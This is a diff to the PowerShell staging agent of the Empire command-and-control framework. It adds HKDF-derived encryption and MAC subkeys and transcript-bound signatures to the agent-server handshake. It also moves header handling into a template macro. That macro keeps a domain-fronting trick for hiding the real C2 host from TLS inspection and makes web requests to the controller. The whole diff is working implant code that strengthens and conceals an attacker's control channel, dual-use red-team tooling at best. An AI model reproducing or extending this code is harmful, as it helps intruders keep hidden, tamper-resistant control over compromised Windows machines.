@@ -788,20 +788,47 @@ function Parse-RoutingPacket {
     return $out
 }
 
+function Get-HkdfSha256Subkey {
+    # HKDF-SHA256 (RFC 5869), single 32-byte output block, salt = 32 zero bytes.
+    # Must stay byte-for-byte identical to the server's HKDF(SHA256, len=32,
+    # salt=None, info=Info) so encrypt/decrypt interoperate.
+    param([Parameter(Mandatory)][byte[]]$Ikm, [Parameter(Mandatory)][byte[]]$Info)
+    $salt = New-Object byte[] 32
+    $h1 = New-Object Security.Cryptography.HMACSHA256
+    $h1.Key = $salt
+    $prk = $h1.ComputeHash($Ikm)
+    $msg = New-Object byte[] ($Info.Length + 1)
+    [Array]::Copy($Info, 0, $msg, 0, $Info.Length)
+    $msg[$Info.Length] = 1
+    $h2 = New-Object Security.Cryptography.HMACSHA256
+    $h2.Key = $prk
+    return ,$h2.ComputeHash($msg)
+}
+
+function Get-EncMacSubkeys {
+    # Returns @($kEnc, $kMac) derived independently from the shared key.
+    param([Parameter(Mandatory)][byte[]]$Kb)
+    $encInfo = [Text.Encoding]::ASCII.GetBytes('empire-enc')
+    $macInfo = [Text.Encoding]::ASCII.GetBytes('empire-mac')
+    return @((Get-HkdfSha256Subkey $Kb $encInfo), (Get-HkdfSha256Subkey $Kb $macInfo))
+}
+
 function Aes-EncryptThenHmac {
     param([Parameter(Mandatory)][object]$Key, [Parameter(Mandatory)][byte[]]$Plain)
     $kb = Get-AesKeyBytes $Key
+    $sub = Get-EncMacSubkeys $kb
+    $kEnc = $sub[0]; $kMac = $sub[1]
     $iv = Get-CryptoRandomBytes 16
 
     try { $aes = New-Object Security.Cryptography.AesCryptoServiceProvider } catch { $aes = New-Object Security.Cryptography.RijndaelManaged }
     $aes.Mode  = 'CBC'
     $aes.Padding = 'PKCS7'
-    $aes.Key   = $kb
+    $aes.Key   = $kEnc
     $aes.IV    = $iv
     $ct = $aes.CreateEncryptor().TransformFinalBlock($Plain,0,$Plain.Length)
     $body = $iv + $ct
     $h = New-Object Security.Cryptography.HMACSHA256
-    $h.Key = $kb
+    $h.Key = $kMac
     $mac = ($h.ComputeHash($body))[0..15]
     return $body + $mac
 }
@@ -811,11 +838,13 @@ function Decrypt-Bytes {
     if(-not $In -or $In.Length -lt 48){ return $null }
 
     $kb = Get-AesKeyBytes $Key            # <-- same normalization on decrypt
+    $sub = Get-EncMacSubkeys $kb
+    $kEnc = $sub[0]; $kMac = $sub[1]
     $mac  = $In[-16..-1]
     $body = $In[0..($In.Length-17)]
 
     $h = New-Object Security.Cryptography.HMACSHA256
-    $h.Key = $kb
+    $h.Key = $kMac
     $exp = ($h.ComputeHash($body))[0..15]
     if(@(Compare-Object $mac $exp -Sync 0).Length -ne 0){ return $null }
 
@@ -824,7 +853,7 @@ function Decrypt-Bytes {
     try { $aes = New-Object Security.Cryptography.AesCryptoServiceProvider } catch { $aes = New-Object Security.Cryptography.RijndaelManaged }
     $aes.Mode = 'CBC'
     $aes.Padding='PKCS7'
-    $aes.Key  = $kb
+    $aes.Key  = $kEnc
     $aes.IV   = $iv
     return $aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length)
 }
@@ -907,6 +936,29 @@ function Convert-ToByteArrayDeep {
     return $out.ToArray()
 }
 
+{% macro apply_custom_headers(hop=False) -%}
+    if ($customHeaders -ne "") {
+        $headers = $customHeaders -split '<HEND>';
+        $headers | ForEach-Object {
+            $headerKey = $_.split(':')[0];
+            $headerValue = $_.split(':')[1];
+            #If host header defined, assume domain fronting is in use and add a call to the base URL first
+            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+            if ($headerKey -eq "host"){
+                try{$ig=$WC.DownloadData($s)}catch{}};
+            $wc.Headers.Set($headerKey, $headerValue);
+        }
+    }
+    if ($UA) {
+        $wc.Headers.Set("User-Agent",$UA);
+    }
+{%- if hop %}
+    if ($hop) {
+        $wc.Headers.Set("Hop-Name",$hop);
+    }
+{%- endif %}
+{%- endmacro %}
+
 function Start-Negotiate {
     param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
 
@@ -950,10 +1002,13 @@ function Start-Negotiate {
     }
 
     $cpBE768 = To-BigEndianFixedFromLE -LittleEndian $pubLE -Length 768
-    $mbytes = [System.Text.Encoding]::ASCII.GetBytes("SIGNATURE")
+    # Sign the STAGE1 transcript (label || our DH public key), not a constant,
+    # so this signature cannot be replayed with a substituted DH key.
+    $agentLabel = [System.Text.Encoding]::ASCII.GetBytes("empire-stage1-agent")
+    [byte[]]$agentTranscript = $agentLabel + $cpBE768
 
     # 3) Concatenate with your 64-byte cert
-    $agentCert  = signature_unsafe $mbytes $Script:skbytes $Script:pk
+    $agentCert  = signature_unsafe $agentTranscript $Script:skbytes $Script:pk
     [byte[]]$stage1Msg = $cpBE768 + $agentCert
 
     # AES-CBC + HMAC with staging key
@@ -968,19 +1023,7 @@ function Start-Negotiate {
     if ($Script:Proxy) { $wc.Proxy = $Script:Proxy }
 
     # the User-Agent always resets for multiple calls...silly
-    if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
-        $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
-        }
-    }
-    $wc.Headers.Add("User-Agent",$UA);
+    {{ apply_custom_headers() }}
 
     # session id (8 bytes ASCII)
     $ID='00000000'
@@ -1007,8 +1050,13 @@ function Start-Negotiate {
     $nonce = $plain[0..15]
     $serverPubBytes = $plain[16..($plain.Length-65)]
     $serverCert     = $plain[($plain.Length-64)..($plain.Length-1)]
+
+    # Verify the server signed this exchange: label || session id || nonce || pub.
+    $serverLabel = [System.Text.Encoding]::ASCII.GetBytes("empire-stage1-server")
+    [byte[]]$sidBytes = [System.Text.Encoding]::ASCII.GetBytes($ID)
+    [byte[]]$serverTranscript = $serverLabel + $sidBytes + $nonce + $serverPubBytes
     try{
-        $result = checkvalid $serverCert $mbytes $Script:serverPubBytes
+        $result = checkvalid $serverCert $serverTranscript $Script:serverPubBytes
 
     }
     catch{
@@ -1074,20 +1122,7 @@ function Start-Negotiate {
     $eb2 = Aes-EncryptThenHmac -Key $SessionKey -Plain $ib2
 
     # the User-Agent always resets for multiple calls...silly
-    if ($customHeaders -ne "") {
-        $headers = $customHeaders -split ',';
-        $headers | ForEach-Object {
-            $headerKey = $_.split(':')[0];
-            $headerValue = $_.split(':')[1];
-	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
-	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-	    if ($headerKey -eq "host"){
-                try{$ig=$WC.DownloadData($s)}catch{}};
-            $wc.Headers.Add($headerKey, $headerValue);
-        }
-    }
-    $wc.Headers.Add("User-Agent",$UA);
-    $wc.Headers.Add("Hop-Name",$hop);
+    {{ apply_custom_headers(hop=True) }}
 
     # stage_2: AES-256-GCM routing with AES/HMAC(SessionKey) body
     $routingPkt2 = Build-RoutingPacket -StagingKeyBytes $SKB -SessionId8 $ID -Language 1 -Meta 3 -Additional 0 -EncData $eb2
